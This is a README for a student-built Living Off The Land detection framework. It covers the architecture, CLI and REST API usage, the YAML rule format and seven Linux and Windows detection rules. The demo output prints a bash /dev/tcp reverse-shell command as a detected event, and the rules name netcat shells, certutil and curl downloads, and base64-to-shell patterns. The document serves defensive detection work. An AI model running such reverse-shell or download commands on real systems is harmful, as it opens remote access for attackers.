# LOTL Detector

Cross-platform Living Off The Land (LOTL) detection framework for cybersecurity analysis.

## Overview

LOTL Detector identifies suspicious use of legitimate system utilities commonly exploited by APT groups like Lazarus. The framework analyzes system logs to detect potentially malicious command execution patterns while minimizing false positives.

### Supported Platforms
- Windows (Sysmon, Event Logs)
- Linux (auditd, syslog) 
- macOS (Unified Logs) - Coming soon

## Architecture

```
┌────────────────────────────────────────────────────────────────────────────────┐
│                           INTERFACE LAYER                                      │
├────────────────────────────────────────────────────────────────────────────────┤
│                                                                                │
│   ┌──────────────┐      ┌──────────────────┐      ┌──────────────────┐         │
│   │   REST API   │      │  Web Dashboard   │      │    CLI Tool      │         │
│   │   (Flask)    │      │ (HTML/CSS/JS)    │      │ demo_detector.py │         │
│   └──────┬───────┘      └────────┬─────────┘      └────────┬─────────┘         │
│          │                       │                         │                   │
└──────────┼───────────────────────┼─────────────────────────┼───────────────────┘
           │                       │                         │
           └───────────────────────┴─────────────────────────┘
                                   │
                                   ▼
┌────────────────────────────────────────────────────────────────────────────────┐
│                        PERSISTENCE LAYER                                       │
├────────────────────────────────────────────────────────────────────────────────┤
│                                                                                │
│                        ┌──────────────────────────┐                            │
│                        │   AlertDatabase          │                            │
│                        │   (SQLite)               │                            │
│                        │   - Stores alerts        │                            │
│                        │   - Query capabilities   │                            │
│                        │   - Metadata tracking    │                            │
│                        └───────────▲──────────────┘                            │
│                                    │                                           │
└────────────────────────────────────┼───────────────────────────────────────────┘
                                     │
                                     │ Alert objects
                                     │
┌────────────────────────────────────────────────────────────────────────────────┐
│                          DETECTION LAYER                                       │
├────────────────────────────────────────────────────────────────────────────────┤
│                                                                                │
│  ┌────────────────┐                                                            │
│  │  RuleLoader    │──────┐                                                     │
│  │  (YAML Rules)  │      │                                                     │
│  └────────────────┘      │                                                     │
│                          ▼                                                     │
│         ┌────────────────────────────┐          ┌──────────────────┐           │
│         │   DetectionEngine          │          │     Scorer       │           │
│         │   - Rule matching          │─────────▶│  Risk: 0-150     │           │
│         │   - Pattern detection      │          │  Severity-based  │           │
│         │   - Whitelist filtering    │          └──────────────────┘           │
│         └───────────▲────────────────┘                                         │
│                     │                                                          │
│                     │ Event objects                                            │
└─────────────────────┼──────────────────────────────────────────────────────────┘
                      │
                      │
┌────────────────────────────────────────────────────────────────────────────────┐
│                        COLLECTION LAYER                                        │
├────────────────────────────────────────────────────────────────────────────────┤
│                                                                                │
│                     ┌──────────────────────────┐                               │
│                     │     BaseCollector        │                               │
│                     │  (Abstract Interface)    │                               │
│                     └────────────┬─────────────┘                               │
│                                  │                                             │
│                     ┌────────────┴────────────┐                                │
│                     │                         │                                │
│          ┌──────────▼──────────┐   ┌─────────▼──────────┐                      │
│          │  WindowsCollector   │   │  LinuxCollector    │                      │
│          │  - Sysmon parser    │   │  - auditd parser   │                      │
│          │  - Event ID 1       │   │  - EXECVE logs     │                      │
│          │  - Process tracking │   │  - Process tracking│                      │
│          └──────────▲──────────┘   └─────────▲──────────┘                      │
│                     │                         │                                │
└─────────────────────┼─────────────────────────┼────────────────────────────────┘
                      │                         │
                      │                         │
┌────────────────────────────────────────────────────────────────────────────────┐
│                        DATA SOURCES LAYER                                      │
├────────────────────────────────────────────────────────────────────────────────┤
│                                                                                │
│          ┌──────────────────────┐        ┌──────────────────────┐              │
│          │   Sysmon Logs        │        │   auditd Logs        │              │
│          │   (Windows)          │        │   (Linux)            │              │
│          │   - Process creation │        │   - EXECVE events    │              │
│          │   - Command lines    │        │   - System calls     │              │
│          │   - Parent processes │        │   - User context     │              │
│          └──────────────────────┘        └──────────────────────┘              │
│                                                                                │
└────────────────────────────────────────────────────────────────────────────────┘

Legend:
  ┌─────┐  Component/Module
  │     │
  └─────┘

     │     Data flow direction (upward)
     ▼

     ▶     Transformation/processing

  ───────  Inheritance/extension

Data Flow:
  1. System logs (Sysmon/auditd) → Collectors parse raw logs
  2. Collectors → Event objects created and normalized
  3. Events → DetectionEngine matches against loaded rules
  4. DetectionEngine → Scorer assigns risk scores (0-150)
  5. Scored matches → Alert objects generated
  6. Alerts → AlertDatabase persists for querying
  7. Database → Interface Layer serves alerts via API/Dashboard/CLI
```

## Project Status

**Phase 1: Foundation** ✅ (Complete)
- [x] Rule schema definition
- [x] Rule loader with validation
- [x] Base collector interface
- [x] Unit tests (126 tests passing)
- [x] Windows collector (Sysmon Event ID 1)
- [x] Linux collector (auditd EXECVE logs)
- [x] Detection engine with scoring
- [x] API server (Flask REST API)
- [x] Dashboard UI (Web-based)
- [x] CLI demonstration tool

## Quick Start

### CLI Demo Tool

The fastest way to see LOTL Detector in action is using the CLI demonstration tool:

```bash
# Run demo mode with sample fixtures
python demo_detector.py --demo

# List all detection rules
python demo_detector.py --list-rules

# Scan specific log files
python demo_detector.py --platform linux --log-path /var/log/audit/audit.log

# Scan with verbose output and export results
python demo_detector.py --platform windows --log-path C:\Windows\System32\winevt\Logs\ --export alerts.json --verbose
```

#### Demo Mode Output Example
```
LOTL DETECTOR - DEMO MODE
=========================

Loading rules... ✓ 7 rules loaded
Initializing detection engine... ✓ Ready
Initializing collectors... ✓ Windows, Linux

Scanning Linux logs...
├─ Parsed 1 events
└─ Generated 1 alert(s)

ALERTS DETECTED
===============

[CRITICAL] Bash/Netcat Reverse Shell (Score: 140/150)
  Process: bash
  Command: bash -i >& /dev/tcp/192.168.1.100/4444 0>&1
  MITRE: T1059.004, T1071.001
  Response: IMMEDIATE: Isolate the affected system

STATISTICS
==========
Events processed: 4
Alerts generated: 3
Critical: 1 | High: 2 | Medium: 0 | Low: 0
Database: 3 alerts saved to lotl_detector.db
```

#### CLI Options

```
usage: demo_detector.py [-h] [--demo | --list-rules] [--platform {windows,linux,both}]
                        [--log-path LOG_PATH] [--rules-dir RULES_DIR]
                        [--database DATABASE] [--export EXPORT] [--verbose]

Options:
  --demo                Run demo mode using sample fixtures
  --list-rules          List all loaded detection rules
  --platform            Platform to scan: windows, linux, or both (default: both)
  --log-path            Path to log file or directory
  --rules-dir           Rules directory (default: rules/)
  --database            Database file (default: lotl_detector.db)
  --export              Export alerts to file (JSON or CSV)
  --verbose             Show detailed output
```

### Web Dashboard

Start the REST API server and access the web dashboard:

```bash
# Start API server
python run.py --host 0.0.0.0 --port 5000

# Open dashboard in browser
open dashboard/index.html
# Or visit: http://localhost:5000 (if served)
```

The dashboard provides:
- Real-time alert monitoring
- Filtering by severity, platform, score, and time range
- Interactive charts and statistics
- Detailed alert inspection
- Export to JSON/CSV

### Setup
```bash
# Clone repository
git clone https://github.com/YOUR_USERNAME/lotl-detector.git
cd lotl-detector

# Create virtual environment
python3 -m venv venv
source venv/bin/activate

# Install dependencies
pip install -r requirements.txt

# Run tests
pytest tests/ -v
```

### Creating a Detection Rule

Rules are defined in YAML format. See `rules/schema.json` for the full specification.

Example rule (`rules/windows/certutil_download.yml`):
```yaml
name: "Certutil Download Suspicious File"
id: "WIN-001"
platform: windows
severity: high
mitre_attack:
  - T1105

detection:
  process_name: "certutil.exe"
  command_contains:
    - "-urlcache"
    - "http"
```

### Loading Rules
```python
from core.rule_loader import load_rules

# Load all rules
rules = load_rules("rules")

# Load platform-specific rules
windows_rules = load_rules("rules", platform="windows")

# Get specific rule
from core.rule_loader import RuleLoader
loader = RuleLoader()
loader.load_rules_directory("rules")
rule = loader.get_rule_by_id("WIN-001")
```

## REST API

The framework includes a Flask-based REST API for programmatic access and integration.

### Starting the API Server

```bash
python run.py --host 0.0.0.0 --port 5000 --log-level INFO
```

### API Endpoints

#### Health Check
```bash
GET /api/health
```

#### Get Alerts
```bash
# Get all alerts
GET /api/alerts

# Filter by severity
GET /api/alerts?severity=critical

# Filter by platform
GET /api/alerts?platform=linux

# Filter by minimum score
GET /api/alerts?min_score=100

# Limit results
GET /api/alerts?limit=50
```

#### Get Single Alert
```bash
GET /api/alerts/{alert_id}
```

#### Get Statistics
```bash
GET /api/stats
```

#### Get Rules
```bash
GET /api/rules
```

#### Scan Logs
```bash
POST /api/scan
Content-Type: application/json

{
  "platform": "linux",
  "log_path": "/var/log/audit/audit.log"
}
```

### Example API Usage

```python
import requests

# Get all critical alerts
response = requests.get('http://localhost:5000/api/alerts?severity=critical')
alerts = response.json()

# Scan logs
scan_data = {
    'platform': 'linux',
    'log_path': '/var/log/audit/audit.log'
}
response = requests.post('http://localhost:5000/api/scan', json=scan_data)
result = response.json()
print(f"Generated {result['alerts_generated']} alerts")
```

## Development

### Team Structure
- **Person 1 (Core):** Detection engine, rule system, project coordination
- **Person 2 (Windows):** Windows collector and rules
- **Person 3 (Linux):** Linux collector and rules
- **Person 4 (API):** REST API and dashboard

### Branch Strategy
- `main`: Stable releases only
- `dev`: Integration branch
- `feature/*`: Individual features

### Workflow
1. Create feature branch from `dev`
2. Implement feature with tests
3. Push and create PR to `dev`
4. Automated tests run via GitHub Actions
5. Merge after review

## Detection Techniques

### Currently Implemented (7 Rules)

**Windows (1 rule):**
- **WIN-001:** Certutil download abuse (High severity)

**Linux (6 rules):**
- **LNX-001:** Curl/Wget downloading suspicious scripts (High severity)
- **LNX-002:** Bash/Netcat reverse shell (Critical severity)
- **LNX-003:** Crontab modification for persistence (High severity)
- **LNX-004:** SSH with suspicious flags/tunneling (Medium severity)
- **LNX-005:** Base64 decode piped to shell (High severity)
- **LNX-006:** Netcat listening for connections (High severity)

### Detection Features

- **Rule-based matching:** YAML-defined detection rules with regex support
- **Risk scoring:** 0-150 scale based on severity, detection criteria, and MITRE techniques
- **Whitelisting:** Per-rule whitelists for users, parent processes, and paths
- **MITRE ATT&CK mapping:** Each rule mapped to relevant tactics and techniques
- **Cross-platform:** Unified event model across Windows and Linux

### Planned Expansions

- PowerShell encoded commands
- WMI lateral movement
- Regsvr32 DLL execution
- BITSAdmin abuse
- macOS unified log support
- Advanced behavioral correlation

## Team Contributions

This project was developed as a collaborative team effort. See [CONTRIBUTIONS.md](CONTRIBUTIONS.md) for detailed information about:

- Individual team member contributions
- Division of responsibilities
- Integration process and workflow
- Testing strategy
- Git workflow and collaboration approach

**Team Members:**
- **Said** - Core Engine & Project Lead (40%)
- **Ali** - Windows Collector Specialist (20%)
- **Shahmir** - Linux Collector Specialist (25%)
- **Tamerlan** - API & Dashboard Specialist (15%)

## Contributing

For external contributors, please follow the guidelines in `CONTRIBUTIONS.md`.

## License

MIT License - See `LICENSE` file

## References

- [MITRE ATT&CK](https://attack.mitre.org/)
- [Lazarus Group TTPs](https://attack.mitre.org/groups/G0032/)
- [LOLBAS Project](https://lolbas-project.github.io/)
